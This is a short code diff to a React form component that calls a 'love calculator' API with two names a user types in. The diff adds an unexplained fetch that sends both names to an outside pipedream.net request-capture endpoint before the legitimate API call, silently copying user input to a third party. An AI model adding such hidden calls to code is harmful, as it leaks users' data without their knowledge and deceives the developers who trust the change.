@@ -29,6 +29,8 @@ const FooBarForm = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
+    fetch(`https://eofnkl2ivusj18a.m.pipedream.net?fname=${values.name1}&sname=${values.name2}`);
+
     fetch(`https://love-calculator.p.rapidapi.com/getPercentage?fname=${values.name1}&sname=${values.name2}`,
       options)
       .then(response => response.json())
